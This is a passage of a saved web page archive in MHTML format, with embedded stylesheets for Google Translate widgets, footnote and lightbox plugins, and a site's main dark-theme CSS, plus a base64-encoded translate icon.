+Content-Location: cid:css-2574fae1-9aac-402e-93ab-641abae49681@mhtml.blink
+
+@charset "utf-8";
+=0A
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-65b9cbf2-e281-44c5-9b6d-f5eb1dda20dd@mhtml.blink
+
+@charset "utf-8";
+
+.goog-te-banner-frame { border-top-color: initial; border-right-color: init=
+ial; border-left-color: initial; border-bottom-color: rgb(78, 109, 172); bo=
+x-shadow: rgb(123, 120, 114) 0px 0px 8px 1px; }
+
+.goog-te-menu-frame { border-color: initial; box-shadow: rgb(123, 120, 114)=
+ 0px 3px 8px 2px; }
+
+.goog-te-ftab-frame { border-color: initial; }
+
+.goog-te-gadget { color: rgb(86, 86, 86); }
+
+.goog-te-gadget img { border-color: initial; }
+
+.goog-te-gadget-simple { background-color: rgb(188, 186, 182); border-color=
+: rgb(125, 122, 115) rgb(163, 159, 152) rgb(174, 172, 166); }
+
+.goog-te-gadget-icon { border-color: initial; }
+
+.goog-logo-link, .goog-logo-link:link, .goog-logo-link:visited, .goog-logo-=
+link:hover, .goog-logo-link:active { color: rgb(61, 64, 65); text-decoratio=
+n-color: initial; }
+
+.goog-te-banner { background-color: rgb(179, 176, 171); }
+
+.goog-te-banner img { border-color: initial; }
+
+.goog-te-banner-content { color: rgb(19, 19, 19); }
+
+.goog-te-banner-info { color: rgb(86, 86, 86); }
+
+.goog-te-button { border-color: rgb(174, 171, 165); }
+
+.goog-te-button div { border-color: rgb(157, 154, 146) rgb(123, 120, 114) r=
+gb(123, 120, 114) rgb(157, 154, 146); }
+
+.goog-te-button button { background-image: initial; background-color: trans=
+parent; border-color: initial; }
+
+.goog-te-button button:active { background-image: none; background-color: r=
+gb(157, 154, 146); }
+
+.goog-te-ftab { background-color: rgb(188, 186, 182); }
+
+.goog-te-ftab-link { text-decoration-color: initial; border-color: rgb(111,=
+ 109, 104); }
+
+.goog-te-ftab-link img { border-color: initial; }
+
+.goog-te-ftab-link span { text-decoration-color: initial; }
+
+.goog-te-menu-value { text-decoration-color: initial; color: rgb(19, 19, 15=
+2); }
+
+.goog-te-menu-value span { text-decoration-color: initial; }
+
+.goog-te-gadget-simple .goog-te-menu-value { color: rgb(19, 19, 19); }
+
+.goog-te-gadget-simple .goog-te-menu-value span { text-decoration-color: in=
+itial; }
+
+.goog-te-menu { background-color: rgb(188, 186, 182); text-decoration-color=
+: initial; border-color: rgb(170, 167, 161); }
+
+.goog-te-menu-item { text-decoration-color: initial; }
+
+.goog-te-menu-item, .goog-te-menu-item:link { color: rgb(19, 19, 152); back=
+ground-image: initial; background-color: rgb(188, 186, 182); }
+
+.goog-te-menu-item:visited { color: rgb(74, 36, 109); }
+
+.goog-te-menu-item:hover { background-image: initial; background-color: rgb=
+(170, 167, 161); }
+
+.goog-te-menu-item:active { color: rgb(19, 19, 152); }
+
+.goog-te-menu2 { background-color: rgb(188, 186, 182); text-decoration-colo=
+r: initial; border-color: rgb(78, 109, 172); }
+
+.goog-te-menu2-separator { background-color: rgb(135, 131, 125); }
+
+.goog-te-menu2-item, .goog-te-menu2-item-selected { text-decoration-color: =
+initial; }
+
+.goog-te-menu2-item div, .goog-te-menu2-item:link div, .goog-te-menu2-item:=
+visited div, .goog-te-menu2-item:active div { color: rgb(19, 19, 152); back=
+ground-image: initial; background-color: rgb(188, 186, 182); }
+
+.goog-te-menu2-item:hover div { color: rgb(188, 186, 182); background-image=
+: initial; background-color: rgb(52, 86, 152); }
+
+.goog-te-menu2-item-selected div, .goog-te-menu2-item-selected:link div, .g=
+oog-te-menu2-item-selected:visited div, .goog-te-menu2-item-selected:hover =
+div, .goog-te-menu2-item-selected:active div { color: rgb(19, 19, 19); }
+
+.goog-te-balloon { background-color: rgb(188, 186, 182); border-color: init=
+ial; }
+
+.goog-te-balloon-frame { background-color: rgb(188, 186, 182); border-color=
+: rgb(78, 109, 172); box-shadow: rgb(123, 120, 114) 0px 3px 8px 2px; }
+
+.goog-te-balloon img { border-color: initial; }
+
+.goog-te-balloon-zippy .minus { background-image: url("https://www.google.c=
+om/images/zippy_minus_sm.gif"); }
+
+.goog-te-balloon-zippy .plus { background-image: url("https://www.google.co=
+m/images/zippy_plus_sm.gif"); }
+
+.goog-te-balloon-zippy span { color: rgb(19, 19, 152); text-decoration-colo=
+r: initial; }
+
+.goog-te-spinner-animation { background-image: url("https://www.gstatic.com=
+/images/branding/product/2x/translate_24dp.png"); background-color: rgb(188=
+, 186, 182); }
+
+.goog-te-spinner-path { stroke: rgb(46, 101, 194); }
+
+#goog-gt-tt html, #goog-gt-tt body, #goog-gt-tt div, #goog-gt-tt span, #goo=
+g-gt-tt iframe, #goog-gt-tt h1, #goog-gt-tt h2, #goog-gt-tt h3, #goog-gt-tt=
+ h4, #goog-gt-tt h5, #goog-gt-tt h6, #goog-gt-tt p, #goog-gt-tt a, #goog-gt=
+-tt img, #goog-gt-tt ol, #goog-gt-tt ul, #goog-gt-tt li, #goog-gt-tt table,=
+ #goog-gt-tt form, #goog-gt-tt tbody, #goog-gt-tt tr, #goog-gt-tt td { bord=
+er-color: initial; }
+
+#goog-gt-tt ol, #goog-gt-tt ul { list-style-image: initial; }
+
+#goog-gt-tt { color: rgb(39, 42, 44); background-color: rgb(188, 186, 182);=
+ border-color: rgb(178, 175, 169); box-shadow: rgba(19, 19, 19, 0.2) 0px 4p=
+x 16px; }
+
+#goog-gt-tt .title { color: rgb(123, 120, 114); }
+
+#goog-gt-tt .status-message { background-image: initial; background-color: =
+rgb(46, 114, 28); box-shadow: rgb(39, 86, 25) 0px 2px 2px inset; color: rgb=
+(188, 186, 182); text-shadow: rgb(39, 86, 25) 1px 1px 1px; }
+
+#goog-gt-tt .activity-link { color: rgb(30, 75, 152); text-decoration-color=
+: initial; }
+
+#goog-gt-tt textarea { border-color: rgb(150, 146, 138) rgb(165, 162, 155) =
+rgb(165, 162, 155); }
+
+#goog-gt-tt textarea:focus { box-shadow: rgba(19, 19, 19, 0.3) 0px 1px 2px =
+inset; border-color: rgb(51, 108, 203); outline-color: initial; }
+
+#goog-gt-tt .translate-form .activity-form input { border-color: rgba(19, 1=
+9, 19, 0.1); color: rgb(61, 64, 65); outline-color: initial; box-shadow: rg=
+ba(19, 19, 19, 0.1) 0px 1px 2px; background-color: rgb(182, 180, 174); back=
+ground-image: -webkit-linear-gradient(top, rgb(182, 180, 174), rgb(180, 177=
+, 172)); }
+
+#goog-gt-tt .translate-form .activity-form input:hover { border-color: rgb(=
+154, 150, 142); color: rgb(39, 42, 44); background-color: rgb(184, 182, 177=
+); background-image: -webkit-linear-gradient(top, rgb(184, 182, 177), rgb(1=
+80, 177, 172)); }
+
+#goog-gt-tt .translate-form .activity-form input:active { border-color: rgb=
+(154, 150, 142); color: rgb(49, 53, 55); background-color: rgb(182, 180, 17=
+5); background-image: -webkit-linear-gradient(top, rgb(182, 180, 175), rgb(=
+180, 177, 172)); }
+
+#goog-gt-tt .translate-form .activity-form input:focus, #goog-gt-tt .transl=
+ate-form .activity-form input.focus { outline-color: initial; border-color:=
+ rgb(51, 108, 203); }
+
+#goog-gt-tt .translate-form .activity-form input.selected { background-colo=
+r: rgb(178, 175, 169); background-image: -webkit-linear-gradient(top, rgb(1=
+78, 175, 169), rgb(169, 167, 160)); box-shadow: rgba(19, 19, 19, 0.1) 0px 1=
+px 2px inset; border-color: rgb(157, 154, 146); color: rgb(49, 53, 55); }
+
+#goog-gt-tt .translate-form .activity-form input.activity-submit { color: r=
+gb(188, 186, 182); border-color: rgb(35, 94, 189); background-color: rgb(51=
+, 108, 203); background-image: -webkit-linear-gradient(top, rgb(51, 108, 20=
+3), rgb(50, 104, 188)); }
+
+#goog-gt-tt .translate-form .activity-form input.activity-submit:hover #goo=
+g-gt-tt .translate-form .activity-form input.activity-submit:focus, #goog-g=
+t-tt .translate-form .activity-form input.activity-submit.focus #goog-gt-tt=
+ .translate-form .activity-form input.activity-submit:active { border-color=
+: rgb(35, 94, 189); background-color: rgb(39, 95, 185); background-image: -=
+webkit-linear-gradient(top, rgb(51, 108, 203), rgb(39, 95, 185)); }
+
+#goog-gt-tt .translate-form .activity-form input.activity-submit:hover { bo=
+x-shadow: rgb(188, 186, 182) 0px 0px 0px 1px inset, rgba(19, 19, 19, 0.1) 0=
+px 1px 1px; }
+
+#goog-gt-tt .translate-form .activity-form input:focus, #goog-gt-tt .transl=
+ate-form .activity-form input.focus, #goog-gt-tt .translate-form .activity-=
+form input:active, #goog-gt-tt .translate-form .activity-form input:hover, =
+#goog-gt-tt .translate-form .activity-form input.activity-submit:focus, #go=
+og-gt-tt .translate-form .activity-form input.activity-submit.focus, #goog-=
+gt-tt .translate-form .activity-form input.activity-submit:active, #goog-gt=
+-tt .translate-form .activity-form input.activity-submit:hover { border-col=
+or: rgb(35, 94, 189); }
+
+#goog-gt-tt .gray { color: rgb(123, 120, 114); }
+
+#goog-gt-tt .alt-helper-text { color: rgb(123, 120, 114); }
+
+#goog-gt-tt .alt-error-text { color: rgb(107, 19, 19); }
+
+.goog-text-highlight { background-color: rgb(168, 164, 158); box-shadow: rg=
+b(129, 126, 120) 2px 2px 4px; }
+
+#goog-gt-tt .alt-menu.goog-menu { background-image: initial; background-col=
+or: rgb(188, 186, 182); border-color: rgb(168, 164, 158); box-shadow: rgb(1=
+29, 126, 120) 0px 2px 4px; outline-color: initial; }
+
+#goog-gt-tt .alt-menu div.goog-menuitem:hover { background-image: initial; =
+background-color: rgb(168, 164, 158); }
+
+#goog-gt-tt .alt-menu .goog-menuitem strong { color: rgb(53, 78, 132); }
+
+#goog-gt-tt .gt-hl-text, #goog-gt-tt .trans-target-highlight { background-c=
+olor: rgb(176, 172, 19); box-shadow: rgba(19, 19, 19, 0.5) 3px 3px 4px; col=
+or: rgb(176, 172, 19); }
+
+#goog-gt-tt .trans-target-highlight { color: rgb(39, 42, 44); }
+
+#goog-gt-tt .gt-hl-layer { color: rgb(188, 186, 182); }
+
+#goog-gt-tt .trans-target, #goog-gt-tt .trans-target .trans-target-highligh=
+t { background-color: rgb(168, 164, 158); box-shadow: rgba(19, 19, 19, 0.5)=
+ 3px 3px 4px; }
+
+#goog-gt-tt span:focus { outline-color: initial; }
+
+#goog-gt-tt .trans-edit { background-color: transparent; border-color: rgb(=
+51, 108, 203); }
+
+#goog-gt-tt .gt-trans-highlight-l { border-left-color: rgb(185, 19, 19); }
+
+#goog-gt-tt .gt-trans-highlight-r { border-right-color: rgb(185, 19, 19); }
+
+#goog-gt-tt #alt-input-text { background-color: rgb(188, 186, 182); color: =
+rgb(49, 53, 55); border-color: rgb(150, 146, 138) rgb(165, 162, 155) rgb(16=
+5, 162, 155); }
+
+#goog-gt-tt #alt-input-text:hover { border-color: rgb(128, 125, 118) rgb(14=
+5, 141, 134) rgb(145, 141, 134); box-shadow: rgba(19, 19, 19, 0.1) 0px 1px =
+2px inset; }
+
+#goog-gt-tt #alt-input-text:focus { box-shadow: rgba(19, 19, 19, 0.3) 0px 1=
+px 2px inset; outline-color: initial; border-color: rgb(51, 108, 203); }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-Location: https://www.gstatic.com/images/branding/product/2x/translate_24dp.png
+
+iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAG/klEQVR4Ae2Y1XMjSR6Ee5+P8d9Z
+Zt6BQ/tMy8xoHDDbO8zMzIxmGIvZzDAkGM9zXuVJ1VaHSlZUXMiHivjUNegvq/InaOPf5fH/B4BH
+8teF8xc1RieWrHqIJT/OsTjBogRvNKbyekOc1xK8t3bmpwIj25iL3DV38ykuWawSlySLJ5DiryZ4
+uWLoDYGRbczFoob4zkus8uoAr88T4MUV000CI9uYi8y7rxGA1D/E30odvxQY2cRcSGGFfIYAFFcH
+eOGHvqUCI5uYC1359P2XARamRuZCJa5fH2uAhaiRuVCLq+Uz12eOF78fXCIwsoW5SC8u5fV3/xVB
+/rr7sNl7MTAwhvGJKUxNTWF6eppXk8nJSZCJiYkUxsfHTcbGxiaHhkb/JDAk5kKK6surd18GIEcu
+uOEPDAoJCk9jZmaGISSWIFbUoXp7+/8sMIghF2pxDXnF7kuW7RlEe4cTff3DQsoSgOLaAYaHh8cE
+BjHkwiqrls/fNIv9zTF4hyK4czeMu/fC8Iv1/pYY8jbOKnef5K65g+YWO+x2L0bHJiiuF0CNQQy5
+mE+cVJ9+gJm7EYTDYSXTd8IoO/IgRf7lOhKvUVe3G15vQHR5XDuAYi4MYsgFJVVI+ftJssGRCE53
+x4hYx0OFRsIoECf0qkKesEatbQ44XV4EAiGKLEwA1kbuPCvTcDZm6T3XdadjyF0/m3b3XxLkrJY1
+8sDnD4pB7KVEenn9AOoB3Sc6T3my7qKoiHpo08rLAOTIedbIBY/Hj2AwxBB8adTuvzIAZVVwYCk/
+PBVhOH15SXKNnPEahUIh9PX1MUR2AlCSrzYMcN0VTRFPN9CXHVGrPKmN16ip2Q6bLV6jYDBepcLi
+ahSVNWjURxEgpRqKAFI8U4Ab7miKvOTweZdZo0BgLkBBcQ1PQiH/TwbwDMYrNCIrlFSZ+jMxkw2X
+5mbleEcsbYDXv7+Gv35RjdxvKpH/fRUKfiDVRASpwZvl9XirolFc5ygqb8gcgFIq9jbNia2/9ED2
+PKXzm6/M/b3Kkw+U8i8KXl4xghwRIO8bIV5M6SoUltSgiJSKAGW1DGGRJ1JeOwBfHqdvh82X0VXn
++UpkHVYKy6qNTIbxRuOsUl5y+JwLnV0uuN0+s0aEA01qtuwVM1GP01ebKU40Aih2eMVx6xtZ72gE
+Z29FcaY7Cv+w9d15mfi788m/UDOLit2DaGm1ocfmgs8XsASwu9ziJOrESdQh0NunklcHsEqrQ0zF
+T0LJbXECDWdiUjqtPPnLqjv4tnY7cr+qxKpdh/lqZAZYs/sQONCNOw5iYGCAg60bwNJtC39dN4vd
+N2NwD0SEcPwDnU+cwMGWKAo3P8woL3lesPlQO3K+qkb+d1W40dYJBmjq6AYHmSfQbXOgv78fg4OD
+GB0dzRxASmbiJRW1evKkfPcAqtcfQM7XK/FF9XrYnW58UbMWfDXacvAk5QlPgVhD6AZ4KT0q8Qzy
+hDW6i6vXu/HJ8jXIEy+n75TXIV/If12/AcFQSAaQISwnwVoJDGLIhVVMT1pLXlI9i0PnXDh3pRV5
+31UL+HJai+4eO2eB4rxaAgwNDTGEfgAprS+eXp6U7uhHaeMOUaNKMEDeD1ViqA9yHtIGICMjI8Qg
+hlyo5fTEdeTJq5Xj+OOnlSj8rhb7Tl7A26yRCPHjzoMIhXrTBZAYxJALfWldcSvPJfjTV1tw8lwT
++NnoekunCFEPzkLD9gMMoR9AKashriNPvtjoR2ubHY7ER+zrrR1ioBvAELXb9rNOMoBEHcAqpi8t
+xXXkn60SJ9B4F03NNvMjNr8j3BAh3q6oB2eiZts+eQrzB3huZXhKV1hf3CovOXjWiY5OZ/I3NRGi
+E2+V1WHn0TMyAEkf4IWVkzlqQQ1pUq0n/4ygdOcAWlrtcLp8rJHlc5EcZJI2gOSp7waKnll+d+r5
+qghUPDcflak8Wxm28MxKK08n+GP9NJpbHLDZPZYA8koyB8gCXxZfW/74aydBHnv1hJVXErx8Al9X
+XEJruwMOh1d+vLbwLwvwzufHfv/EorOw8EYSr59F8Ypr4KtQ9y1+zQxwBjjIFOdVFUBiED5llbwP
+L915cul5/IMlSSw+j5LqG2jvcKC7xwWXywufjwGCFCeqAGRhA5RUNRU/JYQtCPmyqhtoa7ehu5vV
+4S1HP+tDaYZQBSALH+Cbb6785qklFyB5ctF5lFZx5+24dcsJynu8Pvj9AYoTVQCy8AEkeR9dvsPK
+UL4kaeftdhfcHlaHux8glM9UI57UpMAgfMo63y2/Vix3vrWtB11ddlDe5faI6vhEAJ6APyUAr6oA
+Fy935AsMwqeswxqVVF5BU1MnWlu7RIAe2OzsvhMuF+9OiBp5GMabQlI4/v2p8xfbCgzDeMT4/+Pf
+5PF339yL/IxXqK4AAAAASUVORK5CYII=
+
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-b8b78067-5321-4a07-9ea8-c6a1aa91a0b0@mhtml.blink
+
+@charset "utf-8";
+
+.bigfoot-footnote__button { border-color: initial; background-color: rgba(9=
+1, 91, 90, 0.2); text-decoration-color: initial; }
+
+.bigfoot-footnote__button:hover, .bigfoot-footnote__button:focus { outline-=
+color: initial; background-color: rgba(91, 91, 90, 0.5); }
+
+.bigfoot-footnote__button:active { background-color: rgba(91, 91, 90, 0.5);=
+ }
+
+.bigfoot-footnote__button.is-active { background-color: rgb(91, 91, 90); }
+
+.bigfoot-footnote { background-image: initial; background-color: rgb(185, 1=
+83, 178); border-color: rgb(151, 148, 141); box-shadow: rgba(19, 19, 19, 0.=
+3) 0px 0px 8px; }
+
+.bigfoot-footnote.is-scrollable::after { background-image: url("data:image/=
+svg+xml;base64,PHN2ZyB3aWR0aD0iMTJweCIgaGVpZ2h0PSIxNXB4IiB2aWV3Qm94PSIwIDAg=
+MTIgMTUiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB=
+4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgcHJlc2VydmVBc3BlY3=
+RSYXRpbz0ieE1pbllNaW4iPgogICAgPGcgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiI=
+GZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9IkFycm93IiB0=
+cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjAwMDAwMCwgMS4wMDAwMDApIiBzdHJva2U9ImJsYWNrIiB=
+zdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJzcXVhcmUiPgogICAgICAgICAgICA8cG=
+F0aCBkPSJNNSwwIEw1LDExLjUiIGlkPSJMaW5lIj48L3BhdGg+CiAgICAgICAgICAgIDxwYXRoI=
+GQ9Ik0wLjUsNy41IEw1LjAyNzY5Mjc5LDEyLjAyNzY5MjgiIGlkPSJMaW5lIj48L3BhdGg+CiAg=
+ICAgICAgICAgIDxwYXRoIGQ9Ik00LjUsNy41IEw5LjAyNzY5Mjc5LDEyLjAyNzY5MjgiIGlkPSJ=
+MaW5lLTIiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDcuMDAwMDAwLCAxMC4wMDAwMDApIHNjYWxlKC=
+0xLCAxKSB0cmFuc2xhdGUoLTcuMDAwMDAwLCAtMTAuMDAwMDAwKSAiPjwvcGF0aD4KICAgICAgI=
+CA8L2c+CiAgICA8L2c+Cjwvc3ZnPgo=3D"); }
+
+.bigfoot-footnote.is-scrollable .bigfoot-footnote__wrapper::before { backgr=
+ound-image: linear-gradient(rgb(185, 183, 178) 50%, rgba(185, 183, 178, 0) =
+100%); }
+
+.bigfoot-footnote.is-scrollable .bigfoot-footnote__wrapper::after { backgro=
+und-image: linear-gradient(to top, rgb(185, 183, 178) 50%, rgba(185, 183, 1=
+78, 0) 100%); }
+
+.bigfoot-footnote__wrapper { background-color: rgb(185, 183, 178); }
+
+.bigfoot-footnote__content { background-image: initial; background-color: r=
+gb(185, 183, 178); color: rgb(19, 19, 19); }
+
+.bigfoot-footnote__tooltip { background-image: initial; background-color: r=
+gb(185, 183, 178); border-color: rgb(151, 148, 141); box-shadow: rgba(19, 1=
+9, 19, 0.3) 0px 0px 8px; }
+
+.bigfoot-footnote__button::after { color: rgba(91, 91, 90, 0.5); }
+
+.bigfoot-footnote__button:hover::after, .bigfoot-footnote__button.is-active=
+::after { color: rgb(188, 186, 182); }
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-6fa64a1b-615a-49bf-855f-249752c0b0f1@mhtml.blink
+
+@charset "utf-8";
+
+.fancybox-wrap, .fancybox-skin, .fancybox-outer, .fancybox-inner, .fancybox=
+-image, .fancybox-wrap iframe, .fancybox-wrap object, .fancybox-nav, .fancy=
+box-nav span, .fancybox-tmp { border-color: initial; outline-color: initial=
+; }
+
+.fancybox-skin { background-image: initial; background-color: rgb(185, 182,=
+ 177); color: rgb(61, 64, 65); text-shadow: none; }
+
+.fancybox-opened .fancybox-skin { box-shadow: rgba(19, 19, 19, 0.5) 0px 10p=
+x 25px; }
+
+.fancybox-error { color: rgb(61, 64, 65); }
+
+#fancybox-loading, .fancybox-close, .fancybox-prev span, .fancybox-next spa=
+n { background-image: url("https://www.ifmicro.com/assets/lib/fancybox/sour=
+ce/fancybox_sprite.png"); }
+
+#fancybox-loading div { background-image: url("https://www.ifmicro.com/asse=
+ts/lib/fancybox/source/fancybox_loading.gif"); background-color: initial; }
+
+.fancybox-nav { text-decoration-color: initial; background-image: url("http=
+s://www.ifmicro.com/assets/lib/fancybox/source/blank.gif"); background-colo=
+r: transparent; -webkit-tap-highlight-color: rgba(19, 19, 19, 0); }
+
+.fancybox-overlay { background-image: url("https://www.ifmicro.com/assets/l=
+ib/fancybox/source/fancybox_overlay.png"); background-color: initial; }
+
+.fancybox-title { text-shadow: none; }
+
+.fancybox-title-float-wrap .child { background-image: initial; background-c=
+olor: rgba(19, 19, 19, 0.8); text-shadow: rgb(39, 42, 44) 0px 1px 2px; colo=
+r: rgb(188, 186, 182); }
+
+.fancybox-title-outside-wrap { color: rgb(188, 186, 182); }
+
+.fancybox-title-over-wrap { color: rgb(188, 186, 182); background-image: in=
+itial; background-color: rgba(19, 19, 19, 0.8); }
+
+@media only screen and (-webkit-min-device-pixel-ratio: 1.5), not all, not =
+all {
+  #fancybox-loading, .fancybox-close, .fancybox-prev span, .fancybox-next s=
+pan { background-image: url("https://www.ifmicro.com/assets/lib/fancybox/so=
+urce/fancybox_sprite@2x.png"); }
+  #fancybox-loading div { background-image: url("https://www.ifmicro.com/as=
+sets/lib/fancybox/source/fancybox_loading@2x.gif"); }
+}
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://www.ifmicro.com/assets/css/main.css?2.0.4
+
+@charset "utf-8";
+
+html { font-family: sans-serif; text-size-adjust: 100%; }
+
+body { margin: 0px; }
+
+article, aside, details, figcaption, figure, footer, header, hgroup, main, =
+menu, nav, section, summary { display: block; }
+
+audio, canvas, progress, video { display: inline-block; vertical-align: bas=
+eline; }
+
+audio:not([controls]) { display: none; height: 0px; }
+
+[hidden], template { display: none; }
+
+a { background-color: transparent; }
+
+a:active, a:hover { outline: 0px; }
+
+abbr[title] { border-bottom: 1px dotted; }
+
+b, strong { font-weight: bold; }
+
+dfn { font-style: italic; }
+
+h1 { font-size: 2em; margin: 0.67em 0px; }
+
+mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
+
+small { font-size: 80%; }
+
+sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-ali=
+gn: baseline; }
+
+sup { top: -0.5em; }
+
+sub { bottom: -0.25em; }
+
+img { border: 0px; }
+
+svg:not(:root) { overflow: hidden; }
+
+figure { margin: 1em 40px; }
+
+hr { box-sizing: content-box; height: 0px; }
+
+pre { overflow: auto; }
+
+code, kbd, pre, samp { font-family: monospace, monospace; font-size: 1em; }
+
+button, input, optgroup, select, textarea { color: inherit; font: inherit; =
+margin: 0px; }
+
+button { overflow: visible; }
+
+button, select { text-transform: none; }
+
+button, html input[type=3D"button"], input[type=3D"reset"], input[type=3D"s=
+ubmit"] { -webkit-appearance: button; cursor: pointer; }
+
+button[disabled], html input[disabled] { cursor: default; }
+
+input { line-height: normal; }
+
+input[type=3D"checkbox"], input[type=3D"radio"] { box-sizing: border-box; p=
+adding: 0px; }
+
+input[type=3D"number"]::-webkit-inner-spin-button, input[type=3D"number"]::=
+-webkit-outer-spin-button { height: auto; }
+
+input[type=3D"search"] { -webkit-appearance: textfield; box-sizing: content=
+-box; }
+
+input[type=3D"search"]::-webkit-search-cancel-button, input[type=3D"search"=
+]::-webkit-search-decoration { -webkit-appearance: none; }
+
+fieldset { border: 1px solid rgb(192, 192, 192); margin: 0px 2px; padding: =
+0.35em 0.625em 0.75em; }
+
+legend { border: 0px; padding: 0px; }
+
+textarea { overflow: auto; }
+
+optgroup { font-weight: bold; }
+
+table { border-collapse: collapse; border-spacing: 0px; }
+
+td, th { padding: 0px; }
+
+.text-left { text-align: left; }
+
+.text-center { text-align: center; }
+
+.text-right { text-align: right; }
+
+.text-justify { text-align: justify; }
+
+.text-nowrap { white-space: nowrap; }
+
+.text-lowercase { text-transform: lowercase; }
+
+.text-uppercase { text-transform: uppercase; }
+
+.text-capitalize { text-transform: capitalize; }
+
+.center-block { display: block; margin-left: auto; margin-right: auto; }
+
+.clearfix::before, .clearfix::after { content: " "; display: table; }
+
+.clearfix::after { clear: both; }
+
+.pullquote { width: 45%; }
+
+.pullquote.left { float: left; margin-left: 5px; margin-right: 10px; }
+
+.pullquote.right { float: right; margin-left: 10px; margin-right: 5px; }
+
+.affix.affix.affix { position: fixed; }
+
+.scrollbar-measure { width: 100px; height: 100px; overflow: scroll; positio=
+n: absolute; top: -9999px; }
+
+.use-motion .motion-element { opacity: 0; }
+
+html, body { min-height: 100%; }
+
+body { font-weight: 100; font-size: 16px; line-height: 1.5; font-family: He=
+lvetica, Arial, sans-serif; color: rgb(228, 235, 240); min-height: 100%; ba=
+ckground: rgb(0, 0, 0); padding: 0px; margin: 0px; }
+
+.container { position: relative; min-height: 100%; }
+
+.site-header { background: rgb(25, 35, 35); min-height: 56px; margin-top: 2=
+px; position: relative; }
+
+.site-title { font-size: 32px; font-weight: 400; line-height: 56px; letter-=
+spacing: -1px; margin-bottom: 0px; margin-right: 20px; float: left; }
+
+.site-title, .site-title:visited { color: rgb(0, 216, 255); }
+
+.site-title:hover { color: rgba(0, 216, 255, 0.39); }
+
+@media (max-width: 767px) {
+  .site-title { float: none; }
+}
+
+.site-nav-toggle { display: none; }
+
+@media (max-width: 767px) {
+  .site-nav-toggle { display: block; float: right; width: 35px; margin-top:=
+ 13px; background: none; border: none; }
+  .site-nav-toggle span { background: white; display: block; height: 2px; m=
+argin: 5px 0px; }
+}
+
+.site-nav { float: left; line-height: 56px; font-size: 16px; }
+
+.site-nav .page-link { display: block; float: left; padding: 0px 15px; }
+
+.site-nav .page-link, .site-nav .page-link:visited { color: rgb(255, 255, 0=
+); }
+
+.site-nav .page-link:hover { color: rgba(255, 255, 0, 0.39); }
+
+.site-nav .page-link.active { background: rgb(53, 72, 81); }
+
+@media (max-width: 767px) {
+  .site-nav { float: none; display: none; }
+}
+
+.site-wrapper { max-width: calc(900px); margin-right: auto; margin-left: au=
+to; padding: 0px 30px; }
+
+@media (max-width: 767px) {
+  .site-wrapper { padding: 0px 20px; }
+}
+
+.site-footer { padding-top: 15px; padding-bottom: 0px; margin-top: 15px; }
+
+.site-footer .site-wrapper { margin-top: -10px; text-align: center; border-=
+style: solid; border-color: rgba(255, 0, 80, 0.42); border-image: initial; =
+border-width: 5px 10px; background: rgba(255, 0, 80, 0.15); }
+
+.site-footer .site-wrapper p { margin: 0px; padding: 1em; }
+
+.site-footer .site-wrapper p a { text-decoration: none; }
+
+.site-footer .site-wrapper p a:hover { text-decoration: none; }
+
+a { text-decoration: none; overflow-wrap: break-word; }
+
+h1, h2, h3, h4, h5, h6 { font-family: "Open Sans"; }
+
+h1 { font-size: 30px; color: rgb(255, 51, 119); }
+
+@media (max-width: 767px) {
+  h1 { font-size: 28px; }
+}
+
+h2 { font-size: 28px; color: rgb(255, 221, 85); }
+
+@media (max-width: 767px) {
+  h2 { font-size: 26px; }
+}
+
+h3 { font-size: 26px; color: rgb(221, 255, 85); }
+
+@media (max-width: 767px) {
+  h3 { font-size: 24px; }
+}
+
+h4 { font-size: 24px; color: rgb(102, 221, 153); }
+
+@media (max-width: 767px) {
+  h4 { font-size: 22px; }
+}
+
+h5 { font-size: 22px; color: red; }
+
+@media (max-width: 767px) {
+  h5 { font-size: 20px; }
+}
+
+h6 { font-size: 20px; color: cyan; }
+
+@media (max-width: 767px) {
+  h6 { font-size: 18px; }
+}
+
+a { padding-bottom: 1px; text-decoration: none; }
+
+a, a:visited { color: rgb(95, 168, 230); }
+
+a:hover { color: rgb(28, 181, 28); }
+
+ol, ul { padding-left: 0.5em; }
+
+li { margin: 0.3em auto 0.3em 1.5em; list-style-position: outside; }
+
+li pre { margin-left: 0px; }
+
+ul ul, ul ol, ol ol, ol ul { margin-top: 0.5em; margin-bottom: 0.5em; }
+
+dt { font-weight: bold; }
+
+img { border: none; max-width: 100%; }
+
+code { color: rgb(202, 227, 182); font-family: "DejaVu Sans Mono", Consolas=
+, "Liberation Mono", Menlo, Courier, monospace; white-space: pre-wrap; over=
+flow-wrap: break-word; }
+
+p code { padding: 0.5em; }
+
+pre { position: relative; background: rgba(11, 132, 95, 0.26); border: 1.5p=
+x solid rgba(14, 139, 125, 0.2); z-index: 2; transition: all 0.45s linear 0=
+s; padding: 0.8em; margin-left: 1em; overflow-x: auto; }
+
+pre:hover { border: 1.5px solid rgb(14, 139, 125); }
+
+blockquote { margin-left: 0px; margin-right: 0px; padding: 0px 15px; border=
+-top: 1px solid rgba(51, 51, 51, 0.5); border-bottom: 1px solid rgba(51, 51=
